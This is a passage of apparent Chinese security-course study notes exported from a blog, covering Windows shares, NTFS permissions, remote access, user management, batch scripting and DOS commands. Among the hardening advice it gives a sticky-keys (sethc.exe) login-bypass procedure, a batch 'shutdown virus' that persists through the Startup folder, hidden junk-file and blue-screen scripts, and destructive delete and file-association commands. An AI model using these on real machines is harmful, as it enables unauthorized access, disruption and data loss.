&quot;WORKGROUP&quot; 工作组当中。4. 域： (1) 与工作组环境相对应的是&quot;域环境&quot;，一般大型企业都是采用该环境管理。 (2) 该环境虽然绝大多数还是保持用户平等，但是一定存在一个用户，可以无条件的访问该域下所有计算机。 (3) 域管理员，拥有访问所有电脑的资源。 共享文件相关命令1234567891011121. net share (1) 显示共享出去的文件，及其相应的共享文件名。 (2) 微软默认将所有盘符，以及用户家目录设置为共享，或者隐藏共享。虽然可以方便远程管理，但是及其不安全。最好将其关闭！2. net share [共享名] /del (1) 删除该文件的共享。 (2) 该命令虽然可以删除 windowns 默认的一些共享，但是计算机重启后仍然会启动共享。 (3) 计算机默认的共享只能通过修改注册表，以及停止自动共享服务两者方式取消共享。3. net share [共享名]=&quot;文件路径&quot; (1) 打开文件共享。如果文件名后是$，那么该共享为隐藏。 修改注册表以关闭默认共享文件12345678910111. 什么是注册表 (1) 注册表相当于一个城市的户籍部门。专门登陆，注册，记录城市的所有入口信息。 (2) 计算机中，所有应用的作用，相关信息，那个文件是干什么用的，那个公司的。都需要到注册表中进行注册！！ (3) 注册表存在 C 盘，一旦丢失删除，其他盘上装载的软件运行会出现问题。 2. cmd -&gt; regedit 打开注册表编辑器。3. 修改注册表：打开以下路径，然后添加键值。 (1) HKEY_Local_MACHINE\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters\\ (2) 右键新建 REG_DWORD 类型的 AutoShareServer 键，值为 0 关闭 445 共享服务端口 cmd -&gt; services -&gt; 找到 server -&gt; 右击关闭。 这样就关闭了提高共享服务的 445 端口了。所有共享服务全都失效。 修改防火墙入站规则，禁止外来访问 445 端口，利用共享服务漏洞 打开防火墙 打开防火墙高级设置 选择入站规则 -&gt; 新建规则 -&gt; 选择端口号规则 -&gt; 选择 TCP 和 特定端口445 -&gt; 禁用 -&gt; 取名称。 选择入站规则 -&gt; 新建规则 -&gt; 选择端口号规则 -&gt; 选择 UDP 和 特定端口445 -&gt; 禁用 -&gt; 取名称。 相关经验 注意，我们在修改访问控制列表的时候，权限给予的是用户的身份证号，也就是一个 UID。而不是用户本身，因此，如果你将某用户删除，文件系统的访问控制列表中，会存在一个未识别的用户ID号。 fangning\\22157 ===========》 S-1-5-21-2112674742-10913682-775799340-1001 在启动文件夹，添加一条删除默认共享文件的命令。这样可以达到每次开机取消系统默认的共享文件。 一般 web服务器 不需要这些共享服务，所以需要关闭文件共享端口，关闭共享服务。 在路径搜索框输入 \\ \\192.168.101.10\\ADMIN$ ===========&gt; 进入 c:\\windows 目录 \\ \\192.168.101.10\\Users =============&gt; 进入用户家目录 \\ \\192.168.101.10\\C$ ===============&gt; 进入C盘 太可怕了，只要同在一个局域网，并且知道对方 IP 基本上就可以控制对方电脑。 为什么建议软件装在 C 盘？ 软件可以装在其他盘。但是该软件运行安装所产生的注册表是存放在C盘的。 一旦，你重装系统了。虽然说，其他盘的软件不会丢。但是，C盘与之相关的注册表丢失了。 这样就很可能会导致，其他盘的软件在重装完系统后，运行使用过程中会出现各种问题。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"文件共享服务器","date":"2020-07-29T11:30:30.000Z","path":"2020/07/29/2020.07.29 文件共享服务器/","text":"第十章、文件共享服务器共享服务器概述 CIFS (common internet file system通用的互联网文件系统)：一种文件共享协议protocol。 通过网络实现文件的共享、下载、上传。 该服务器内嵌在系统中，无需按照部署。 环境配置 两台笔记本需要通过 ping 通。构成一个局域网。 然后计算机1，可以新建一个文件夹，并且在属性栏里面将该文件打开共享。 然后在计算机2，通过网络目录，例如：” \\ \\ 192.168.101.10 \\ share”来访问计算机1 共享出的文件。 注意：123456789101112131415161718191. 文件右击 -&gt; 属性 -&gt; 共享 -&gt; 共享该文件 -&gt; 修改共享名 (1) 共享文件后，会在网络生成一个网络路径，其中路径中显示的文件夹名称是该文件的&quot;共享名&quot;。 2. 修改共享文件的访问控制列表： (1) 访问控制列表中的用户，或者组。可以通过局域网络访问该共享文件。 (2) 和 NTFS系统一样，也可以更改访问端用户的权限。只读，或者完全控制。3. 关于&#x27;访问控制权限&#x27;。 (1) 如果访问共享文件的用户是&quot;本地登陆&quot;, 也就是同一台PC, 同一个物理地址。那么&quot;他访问控制权限只受到文件系统权限限制&quot;。 (2) 如果访问共享文件的用户是&quot;远程登陆&quot;, 也就是在另外一台电脑上，远程通过网络访问该文件夹。那么&quot;他访问控制权限受到 共享权限 和 文件系统的访问控制列表 的双重性质，并且权限取交集&quot;。 (3) 也就是说，如果你要给一个用户配置共享文件的访问权限，不仅要关注共享访问控制列表，还要配置文件系统的访问控制列表。4. 一般我们将共享权限设置成 Everyone + 完全控制。 然后，再取消继承。 最后再到，文件系统权限列表设置你所需要给别人设置的权限。 &quot;这样两者取交集，最后还是你所需要设置的权限&quot;。6. 如果共享的文件包含许多子文件夹，并且需要设置不同的访问控制权。可以脱离父继承关系，然后单独给子文件夹设置权限。但是总文件夹一定要设置可以访问。 相关经验 对内一般用 CIFS 文件共享协议，对外一般用 FTP 协议。 需要同在一个局域网才能使用 CIFS 服务器进行文件共享！ 今天拿真人机做实验的时候发现，windowns的users文件夹居然默认是共享到局域网的！！！ 同样的，c:\\windows目录以及各大盘符居然都是默认共享。美其名曰远程管理，其实很容易泄露数据啊。再看看访问控制列表：（居然是Everyone，也就是说，只要同在一个局域网，别人就可以访问你的家目录！！） 解决办法：就算关了共享，还是会自动启动，所以最好就是共享就共享。都是把共享权限里面的everyone给删掉。这样，别人看到user，但是仍然访问不了。因为远程访问需要受共享权限限制！！ 重大发现：如果你有两台计算机都是windowns系统。如果你其中一台是用微软账户登陆的，那么在另外一台账户上，如果也用该微软账户登陆。 那么，两个系统的用户其实是同一个用户。彼此之间的远程控制，或者远程访问，不需要登陆账户密码。 难怪我好奇，为啥虚拟机的用户名，和我物理机的一模一样，而且虚拟机里面的用户我还不能改密码。原来都是同一个用户！22157（方宁）","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"ntfs安全权限","date":"2020-07-27T02:30:30.000Z","path":"2020/07/27/2020.07.27 ntfs安全权限/","text":"第九章 NTFS安全权限学习目的**为了能够针对不同的用户，给文件设置不同的访问权限！ ntfs文件系统概述 设置 NTFS 权限，实现不同用户的不同程度的访问。 复制文件被篡改和删除。 文件系统概述 存储文件的格式叫做文件系统： 常见有以下系统格式： windows: ​ FAT ​ NTFS ( new technology file system) Linux常见的： EXT 计算机的文件系统是一种存储和组织计算机数据的方法，它使得对其访问和查找变得容易。文件系统使用 文件和树形目录 的抽象逻辑概念，用户只需要关心每个文件所在的文件夹或路径，并不需要你知道数据存放在那个块里面。 NTFS特点 提高磁盘读写率。 可靠性，加密文件系统，访问控制列表（设置权限） 磁盘利用率，压缩，磁盘配额（为不同的用户，分配不同大小的使用空间）。 支持单个文件大于 4G。 修改 NTFS 访问控制列表 如果 NTFS 文件系统是一种抽象数据类型的话。那么，里面所提供的访问控制列表的所有权限就可以看出不同的方法。 这些方法，被封装在一个文件系统接口，或者说是类里面。 对于一个文件夹，以及其中的子文件夹。子文件夹的访问控制权限，默认是继承了父文件夹的访问控制权限。但是，这种继承关系，可以在高级中脱离，然后就可以修改自己的访问控制列表。 访问控制列表中，administrators 组成员拥有修改文件所属权的权限，该文件的所属权，默认是赋予给创建该文件的组 create owners。 是否拥有文件的控制权，决定了你是否拥有特殊权限，也就是修改访问控制列表的能力。 一般情况下，对一个文件夹进行安全权限操作。脱离父继承关系，删除除管理员以外的用户或组。 然后，再根据需要，添加相应的用户或者组。 对文件进行复制，或者剪切的时候。文件一旦进入另外一个路径，就会继承该路径的父文件夹的访问控制列表。 如果你需要对某一组开发一项权限，但是对改组内的其中一个用户不信任，不想让他获得该权限。那么无需将他踢出改组，只需要在访问控制列表中加入该用户，然后单独为他设置禁用权限。 12&quot;管理员拥有最高的权限，包括对所属任何用户文件的NTFS的访问控制表的修改&quot;即使你自己新建了一个文件夹，并且将访问控制列表中只保留自己拥有最高权限。但是&quot;你如果不是管理员，你将无法获得特殊权限，这就导致了，管理员可以修改你的文件的所属权！！&quot; 关于移动、复制、剪切操作后，文件访问控制列表的改变 首先： 同一磁盘下：移动 == 剪切 不同磁盘下：移动 == 复制 然后： 只有在同磁盘下，进行剪切，或者移动文件。该文件的访问控制列表不会改变。 最后： 跨磁盘的复制，移动，或者剪切操作，都会改变文件的访问控制列表，直接继承目标路径的父列表。 同一磁盘下，如果是复制的话，也会改变复制后文件的访问控制列表。 因此，在管理员向用户分发文件的时候，最好是用复制。 相关经验 针对每个用户，自己家目录里面的所有文件，是拥有完全控制权限的。 但是，对于家目录之外的文件，只有被赋予 ntfs 权限后，才能进行文件的读写。 若你只有一个文件夹的写入权限的话，你可以上传文件到该文件夹，但是不能删除，和修改。但是，对你自己上传过的文件，可以进行覆盖。 若你对某用户设置的权限与实际拥有的权限不一致时，检查该用户是否属于访问控制列表中另外的组中。这种情况可能会导致用户的权限叠加。 比如我想让 a 只读该文件，那么a用户就不能属于管理员组，因为管理员组拥有该文件的最高权限。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"服务器远程管理","date":"2020-07-26T10:30:30.000Z","path":"2020/07/26/2020.07.26 服务器远程管理/","text":"服务器远程管理远程控制方式 图形界面远程控制 telnet 命令行远程控制，通过telnet协议进行。 远程连接服务器操作(图形界面控制)1234567891011121. 先配置两台计算机的ip，属于同一网段，并且可以 ping 通。2. 配置服务端： 1) 打开远程连接服务。 2) 设置一个用于别人远程控制的用户，并且赋予一定的权限。为保证安全性，最好不要暴露服务器的管理员组，或者管理员用户。 3) 设置一个可以拥有远程登陆权限的账户。 管理员账户默认拥有远程桌面权限。 其他账户需要添加到：Remote Desktop Users组当中。3. 配置客户端： 1) 通过cmd-&gt;mstsc打开远程控制程序。 2) 通过ip地址链接服务器，通过用户密码登陆服务器。 远程连接服务器操作(Telnet 协议)1234567891011121. 先配置两台计算机的ip，属于同一网端，控制端可以 ping 通服务端。2. 配置服务端 1) 打开 Telnet 服务。 2) 添加一个用户，设置用户密码，给予制定权限。 2) 添加能够远程登陆服务器的用户到 TelnetClients 组。3. 配置客户端 1) cmd 打开命令行 2) telnet [目标服务器ip地址] 3) 输入用户名和密码控制。 4) 然后，你现在所在的命令行，就是你服务器所在的命令行！！ 命令1234567891. 命令 netstat /an 1) /a 显示所有连接和侦听端口。 2) /n 以数字显示地址和端口号。2. telnet 端口号 233. RDP(remote desktop protel远程桌面协议) 端口号 3389 系统密码破解仅适用于win7, xp等旧版windowns系统。亲测，win10已经修复。 1234567891011121. 在你不知道别人 win7 密码的时候。2. 利用篡改连续按五次 shift 键弹出的 sethc.exe 粘滞键程序，将其改成cmd.exe。然后就可以通过不登陆系统的情况下，调用命令行窗口，进行修改用户密码指令。3. 那么如何篡改该程序呢？通过另外一个&quot;启动修复漏洞&quot;。win7刚开机的时候，直接给电脑断电，然后再次开机，会出现一个启动错误修复弹窗，如未出现，多次重启断电重试。4. 通过点击启动修复程序，在系统修复失败的时候，查看问题详情，这时内容拉到最后，打开一个记事本超链接。5. 系统会打开一个文件。文件不重要，重要的是记事本编辑器，改编辑器有一个菜单栏-&gt;文件-&gt;打开。这时，你就可以看到它的系统内部文件。修改原sethc.exe程序名，然后，我们找到c:\\windowns\\system32\\cmd.exe复制，重命名为sethc.exe。6. 这时，就篡改成功了！！可以通过五次shift键，调用出cmd.exe。查找用户，修改用户密码为空。 相关经验 一般只要 ping 通，目标服务器打开远程控制端口。就可以进行远程控制。 重大发现。一般我们使用 win10 的话，自己本身所使用的用户并不是管理员用户。 而且，如果是家庭版的话，也没有用户和组的选项，控制面板更加不会显示administrator 但是，其实这个管理员用户是存在的，只是默认被禁用了。可以用 net user administrator /active:yes启动","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"用户与组管理","date":"2020-07-25T08:36:30.000Z","path":"2020/07/25/2020.07.25 用户与组管理/","text":"第六章 、用户与组管理1、用户用户概述： 每个用户登陆系统后，都会拥有一个不同的操作权限。 每个用户都有自己的一个 SID(安全标识符)。 用户 SID: S-1-5-21-2112674742-10913682-775799340-1001系统 SID: S-1-5-21-2112674742-10913682-775799340 用户 SID = 系统SID-用户的UID UID: 500 Administrator的 UID：500 普通用户的 UID：从1000开始。 Linux系统管理员root 的 UID：0 命令 whoami 显示用户名 whoami /user：显示用户 SID 账户密码存储位置：c:\\windows\\system32\\confi\\SAM #暴力破解，撞库www.cmd5.com windows 系统上，默认密码有效期最长 42 天，6周。 内置账户： 给人使用账户： administrator (管理员账户) guest (来宾账户，比如学校里面的电脑) 计算机服务组件相关的系统账号 system (系统账户 == 至高无上) local services (本低服务账户 == 权限等于普通用户) network services (网络服务账户 == 权限等于普通用户 ) 配置文件 每个用户在第一次登陆的时候，会产生一个 userprofile 路径。例如： c:\\用户 c:\\documents and settings 用户管理命令123456789101112131415161718191. net user 1) 列出当前用户列表2. net user [用户名] 1) 查看该用户详细信息。3. net user [用户名] 新密码。 1) 给该用户修改密码。4. net user [新用户名] [用户密码] /add 1) 新建用户。5. net user [用户名] /del 1) 删除用户 6. net user [用户名] /active :[yes/no] 1) 激活 或 禁用 该用户。## 增， 删， 查， 改， 禁 2、组管理组概述 简化权限赋予。 赋权限方式： 用户-&gt;组-&gt;赋权限 用户-&gt;赋权限 内置组系统有些自带的组，已经被系统默认赋予了一定的权限，用于管理不同的功能。 1234561. administrators # 管理员组2. users # 普通用户组3. network congiguration operators # 网络配置组4. print operators # 打印机组5. remote Desktop # 远程桌面组6. guests # 来宾组 组管理命令123456789101112131415161. nat localgroup # 查看所有本地分组。2. nat localgroup [组名] # 查看制定小组成员3. nat localgroup [组名] [用户名] /add # 添加用户到组，成为成员4. net localgroup [组名] [成员名] /del # 删除该组中的制定成员 5. net localgroup [新建组名] /add ## 添加新的小组 ## 新建的组暂时没有任何权限，需要人工添加权限 相关经验 windows 服务器：win2000、win2003、win2008。 linux 服务器：Redhat(开源付费)、Centos(开源免费) 系统内置的系统账户之所以要分三个，系统账户、本地服务账户、网络服务账户。 是因为，一旦某个服务所允许的进程被攻击后，只会失去管理该服务那个账户权限，不会得到其他账户的权限。 组的概念是为了简化权限赋予。 公司很多人，很多部门。他们需要的权限不一，所以需要给一群所需权限一致的人集中放到一个组当中。 然后，只需要给改组赋予权限就足够。 win10中并不存在管理员用户。只有管理员组。平时我们用的账号，22157 存在于管理员组和普通用户组中。 注意：system权限 &gt; 管理员权限 &gt; 管理员组员权限","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"bat批处理文件","date":"2020-07-17T09:08:00.000Z","path":"2020/07/17/2020.07.17 批处理/","text":"批处理1123456789101112131415161718191. 新建 .bat 文件写批处理命令&gt; 在 bat 文件中编写批处理命令。双击运行2. 命令 pause&gt; 暂停，输出“按任意键继续...”，脚本停止，知道获取输入。3. 命令 @echo off&gt; 关闭回显。&gt; 脚本在 dos 窗口运行过程中，所键入的 dos 命令被隐藏起来。只显示运行过程中的输出结果。4. 命令 color 0A&gt; 改变字体颜色，前者为背景色，后者为字体颜色。&gt; 具体 可使用 help color 查看其他颜色。5. 定义变量，&#x27;=&#x27; 号左右不能加&quot;空格&quot;!&gt; set a=100 #定义时复制&gt; set /p b=请输入一个数 #定义后，用户输入值&gt;&gt; 使用变量时，用 echo %a%, %b% #用百分号引起来 制作恶意脚本，并且放置到开机启动文件夹中123456789将关机脚本比编好，然后放到开机自动启动的程序文件夹中。这样一旦启动计算机，就会运行一遍该脚本使得计算机关机！@echomove 关机.bat &quot;C:\\Users\\22157\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\关机.bat&quot;shutdown /p # 直接强制关机# 也可以使用 shutdown /s /f /t 0# 0 秒后强制关机。 批处理212345678910111213141516171819202122231. 冒号 &#x27;:&#x27; 和 &quot;goto&quot; 命令。 1) :d ：表示接下来的批处理指令属于块&#x27;d&#x27;范围。 2) 代码块名称只能是 &quot;英文&quot;。 2) goto d：批处理允许到此处直接跳转到模块d,然后继续往下运行。eg: :part_1 start :part_2 goto part_1 注：以上批处理命令为死循环！！ 2. 命令 start 1) 单独一个 start 表示打开 cmd.exe 2) start [域名 / 程序名] 表示打开该网页或者程序。 3. 变量 userprofile 1) 表示一个变量，使用时需要用%userprofile%引起来。 2) 改变量的值表示相应电脑中的用户路径：如 set userprofile=&quot;c:\\Users\\22157&quot;。 3) 因此每台win10电脑的启动程序路径都可以用以下表示： &quot;%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&quot; 4. 命令 title [字符串] 1) 修改命令窗口名称。 变量 和 if语句：12345678910111213141516171819202122232425261. 设置变量： 1) 变量声明和初始化： set time=100 2) 变量声明和用户输入： set /p time=用户输入提示语 3) 变量的使用 eg： shutdown /s /f /t %time%2. if 语句： 1) if &quot;条件一&quot;==&quot;条件二&quot; goto menue 2) 条件中可以是变量的引用 %time%， 可以是数值 100 3) 3. timeout 命令： 1) 按任意键结束延时 timeout /t 60 1&gt;nul 2&gt;nul 2) 按ctrl+c结束延时 timeout /t 60 /nobreak 3) 或者通过 ping /n来实现间接延时： ping /n 60 127.0.0.1 1&gt;nul 2&gt;nul4. taskkill 命令： 1) 杀掉制定进程：taskkill /im [进程名] taskkill /im exploreer.exe #桌面进程5. ntsd -c q -pn winlogon.exe 1) 杀掉windowns登陆进程，该命令只适用于xp 2003。 2) 该进程不能被 taskkill 杀掉。 相关经验 开机启动程序文件夹 win 10: C:\\Users\\22157\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 或 %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup win xp - 2003: %userprofile%\\「开始」菜单\\程序\\启动 如果把脚本往这里面一放，那么这个电脑每次开机都会运行该程序。 但是，一般的杀毒软件都会检测这个地方的文件修改，所以程序一般放不进去！ 不知道为什么在脚本里面用 echo 指令， 在运行时输出中文时会乱码！ 注意在路径名称含有空格时，路径需要用英文双引号引起来。 发现一个奇怪的东西。我们运行 bat 文件的时候，系统会直接调用 cmd.exe。 如果bat命令中用到了一些系统软件指令，比如 shutdown , logoff(注销) 的话系统会直接调用 shutdown.exe 和 logoff.exe。 两种应用程序区别是，cmd.exe可以多进程调用，实现多开。而shutdown.exe 和 logoff.exe 只要有一个在运行，再次调用就无效。 我发现了一个问题，就是，如果我把 bat 文件名称改成系统软件的名称，如 shutdown.bat ，然后我再在里面使用 shutdown /s /f /t /50 的命令，当cmd.ext 运行到该指令的时候，它会去找可执行的 shutdown 程序，然后最近的又是 shutdown.bat 自己。这就会形成一个无限递归调用自身！！ 相关病毒关机病毒（修改启动程序文件，会被安全管家检测到！）12345@echo offset a=&quot;%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&quot;echo @echo off &gt; %a%\\GuanJi.batecho shutdown /s /f /t 60 &gt;&gt; %a%\\GuanJi.batshutdown /s /f /t 60 解除关机123456@echo offshutdown /aset a=&quot;%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&quot;cd %a%del GuanJi.bat /q 1&gt;nul 2&gt;nul 制造大垃圾文件（win10 如果要在 C 盘下创建，需要管理员权限允许 .bat 脚本）123@echo offfsutil file createnew d:\\system.ini 2147483640 1&gt;nul 2&gt;nulattrib +s +h +r +a d:\\system.ini 1&gt;nul 2&gt;nul 删除垃圾123@echo offattrib -s -h -r -a d:\\system.ini 1&gt;nul 2&gt;nuldel d:\\system.ini 1&gt;nul 2&gt;nul win xp 2003蓝屏1ntsd -c q -pn winlogon.exe ## 杀windowns 登录进程，由于你已经登陆，所以该进程杀不死，所以只能蓝屏","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"DOS命令","date":"2020-07-16T05:08:00.000Z","path":"2020/07/16/2020.07.16 dos命令2/","text":"Dos 基础命令2 命令 fsutil fsinfo drives 查看磁盘驱动列表。 命令 echo [字符串] 回显，屏幕上打印一含字符串 扩展： echo [字符串] &gt; [文件名称] #输出字符串到文件中。 echo[字符串] &gt;&gt; [文件名称] #追加字符串到文件中。 [命令] &gt;&gt; 输出信息.txt #将命令运行得到的正确信息提示输入 [命令] 2&gt;&gt; 错误提示.txt # 将命令运行得到的错误信息提示输入 命令 type [haha.txt] 打印显示文件内容，支持文本，word。不支持图片 命令 del [文件名称] […] 删除文件。 区别于 rd。后者是删除空文件夹。/s 递归删除。 del *.txt # 删除所有文本文件 del *.doc # 删除所有word 文件 del * . * /q # 删除该路径下所有文件，无提示执行 del * .* /s /q # 递归删除该路径下所有文件。包括子文件中的文件 命令 [命令] 1&gt;nul 2&gt;nul 屏蔽掉命令执行过程中得到的错误提示，或者正确提示。 ‘1&gt;’：表示正确提示 “2&gt;”：表示错误提示 “nul”：表示空，输出到空域，即不保存。 命令 ren [文件名] [新文件名] 重命名文件，文件夹 rename = ren 命令 attrib [+/- s] [+/-h] [文件/文件夹名称] attribute 属性 修改文件或文件夹属性 s：system 系统级属性 h：hide 隐藏属性 r：只读属性 命令 shutdown -s 关机，注销，睡眠等功能。 shutdown -s -t 60 -f # 60秒后强制关机！ shutdown -a # abolishi 取消关机 shutdown -r # 重启 shutdown -p # 关机 shutdown -l # 注销 shutdown -h # 睡眠 shutdonw -c “认命吧，别挣扎了！” # 添加关机提示语（content 内容） 扩展 | more 实现分页。 若在屏幕上需要显示的内容太多，加上这个符号可以实现分页。 命令 color ? 改变背景和字体的颜色 默认黑底白字，可以用 0A 改成 黑底绿字。 问好可以回车打出指令说明，或者用 help color 命令 pause 暂停功能 命令 copy / move [源文件路径] [目标路径] copy c:\\aa.txt d:\\bb.txt 将文件 aa 复制到D盘，重命名为 bb move c:\\aa.txt d:\\bb.txt 将文件 aa 移动到D盘，重命名为 bb 1注意：在路径名中含有空格时，一定记得加双引号&quot;c:\\File one\\aa&quot; 命令 copy con [文件] 同时输入多行信息到文件中。 而不是 echo string &gt;&gt; hh.txt 复制控制台(consolon)信息到 文件中。 eg: copy con LOVE.txt Dear SaoGui ​ I Love You for many fears. ​ Now, I tell you! ​ Can You Accept Me? ​ Yours SaoXian ctrl + Z #结束输入 type LOVE.txt Dear SaoGui … 命令 assoc [.txt]=txtfile 修改关联性（associativity / associate）。win10 系统必须取得管理员cmd程序。 以 .txt 结尾的文件关联到 txtfile 类型 破坏性修改 assoc .txt = exefile / assoc .exe = txtfile 相关经验 突然发现，看视频所学到的东西少了点，而且学得很慢。 dos 命令的话，我觉得可以自己找本相关的书系统的学一遍，就很快了。 两条破坏性命令 del *. * /s /q &gt;nul 2&gt; nul #只删除所有文件和子文件夹中文件 rd . /s /q &gt;nul 2&gt;nul # 删除所有文件 和 文件夹 Dos 里面的指令要么是某个英文短语的首字母缩写。要么是某个单词的前三个英文字母。比如，rename = ren，delete = del， make directors = md，remove directors = rd，change directors = cd 等等…… 在 python 代码块里面写内容，关键字有颜色。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"DOS命令","date":"2020-07-15T08:08:00.000Z","path":"2020/07/15/2020.07.15 dos命令/","text":"第五章 DOS 命令C: \\WINDOWS \\ system \\ cmd.exe 记住这个路径，C盘下，windows 文件夹下，系统文件夹下，有许多的系统程序，其中就有 Dos 命令输入程序。 常用 Dos 命令 C: \\ Documents and Settings \\ Administrator &gt; C: 表示在 C 盘下 \\ Documents and Settings : 表示路径 ‘&gt;’ : 当前所在路径下进行操作。 上一级命令 cd .. ：cd(change directory) 改变路径，两个 ‘ . ‘ 表示上一级 ‘ . ‘：一个点表示当前目录。rd . /s /q 删除本目录下所有文件。 ‘..’：cd ..\\22 表示返回上一级目录后再打开 22 文件夹。 查看当前路径下所有文件 dir 转到 D 盘，或者其他新的盘符。 d: ：回车后直接打开 D 盘。 新建文件夹 md DiretoryName：make directory 创建文件夹，文件夹名称为 DiretoryName。 文件夹名称参数可以加多个，同时创建多个文件夹，名称间用空格个隔开。 如果想创建包含空格的文件夹名称，那么该名称必须用双引号引起来 打开文件夹 + 补全文件路径 cd + 文件夹前几个字母 + Tab键： 比如该路径下有一个文件夹名称叫：DirectoryName 我要打开它：cd Dir + Tab(补全名称) 就直接出现 cd DirectoryName ，回车即可打开。 Tab 键 可按多次，进行多次匹配。 删除文件夹 rd 文件夹名称 文件夹名称 … : remove directory 删除多个文件夹 注意：默认情况下，该命令只能删除空文件夹。 rd 文件夹名称 /s /q: /s ：是递归删除的意思，容易知道，你在用这个命令删除文件夹时，如果该文件内还有其他文件夹，它是从最里面开始删除的，然后返回上一层继续删，知道达到递归出口。 /q：是 quiet 安静的意思，就是消除删除提示。 /f： 是 forse 强制的意思，某些占用的文件，删不了就强制删除。 相关经验 Dos 命令中的文件路径，一律用反斜杠 “ \\ “。修改符 一律用斜杠”/s /f /q” 每个盘符下的文件夹内都默认会有两个名叫”.” 和 “..”的隐藏文件夹，分别用于 和 返回上一级路径。 win2003 下 dos 命令框中中英文切换，用 ctrl + 空格。 绝对路径，和相对路径。 相对于你当前路径的路径，为相对路径，如一个点 ‘.’ 表示当前路径，’..’ 表示相对当前路径的上一级路径。eg: ..\\456 具体的完整路径名称 如”c:\\windows\\system\\cmd.exe”，为绝对路径。 eg: \\abs\\456 D: \\abs\\11&gt; cd \\abs\\22 # \\ 表示根目录，\\abd\\22 表示从根目录开始找文件夹 22。 D: \\abs\\222&gt; _ 不足 磁盘操作系统如果只学这些个简单的入门命令未免不够系统，也不够深入。具体的进阶dos，可以看菜鸟教程里面的 Dos 手册，或者 w3cschool 的 Dos 手册，后者界面稍微友好一点。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"进制","date":"2020-07-14T09:08:00.000Z","path":"2020/07/14/2020.07.14 进制转换/","text":"第四章 、进制转换数值类型二进制这个比较简单，就不记笔记了。快速的十进制转二进制的话。 256 128 64 32 16 8 4 2 1，然后进行凑数，比如 190 = 128 + 32 + 16 + 8 + 4 + 2 找不大于190最大的数，128 找不大于190-128=62最大的数，32 找不大于62-32=30最大的数，16 找不大于30-16=14最大的数，8 找不大于14-8=6最大的数，4 找不大于6-4=2最大的数，2 十六进制（FE）16 = (1111 1110)2 每位十六进制转化成四位的二进制进制。 反之亦然。 相关经验 除了配置 IP ，每台电脑网卡出厂时，都有一个固化进去的物理地址。俗称 Mac(Media Access Control Address) 地址，物理地址，或者局域网地址。该地址全球唯一，并且跟随你的电脑的一辈子，并且无法更改！能改是能改，但是只能伪改，相当于蒙蔽计算机，但是可能重启后还是原 Mac。该地址由于其唯一性和不可更改性，可以进行跟踪标识。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络术语","date":"2020-07-13T03:08:00.000Z","path":"2020/07/13/2020.07.13网络方面的专用词汇/","text":"网关路由器：使能够访问内外网。 网关： 一个网路的出口，Gateway = GW。 路由器的内网接口，必须配置一个 ip，并且该 ip 一般是该局域网网段内的第一个地址，或者最后一个地址。例如对于网段，192.168.101.0 网段内，路由器的 ip 可以是 192.168.101.1 或者 192.168.101.254。 网关，就是该局域网内外的路由器 ip 地址，一般网关很好猜，只要知道该局域网的网段，一般就是第一个，或者最后一个 ip。 当一台 PC 去访问另外一台 PC 进行通信，首先将自己的 ip 与 目标 ip 进行比较，看是否在同一网段。 如果不在同一网段，那么继续把目标地址 ip，交给网关192.168.101.254。然后网关将在更上一层寻找目标 ip。 DNSDNS：Domain Name Service 域名服务器。 计算机访问一个域名： 1）不知道啥意思，劳资要的是 ip。 2）先问自己，自己是否以前访问过，本地是否有缓存。DNS缓存，该处可以被投毒！！。 3）再问本地解析文件，HOST文件（一般为空，除非人工往里面写过）。 4） 求助于别人，那就是 DNS 服务器，该服务器的 DNS 服务器事先必须知道。可以根据你搜索到的 DNS 服务器进行手动配置。 每个地方都有每个地方的 DNS 服务器，根据地方的发展程度，可能有很多 DNS 服务器，也可能没有 DNS 服务器。 5）如果把 DNS给去掉，那么虽然可以上网，但是呢你在浏览器里面可能就要输入你所需要访问的服务器 ip了！ 常用命令：通过 nslookup(name server lookup) + 域名，可以查看该域名的服务器 ip 地址。 常用命令 ipconfig #查看 IP 地址基本信息 ipconfig /all # 查看 IP 地址详细信息 nslookup www.jd.com # 手动域名解析 ping 192.168.101.2 # 发送网络探测数据包，检测网络连通性 ping -t number 目标 IP # 发送连续的数据包，ctrl + C 停止 ping -n number目标 IP # 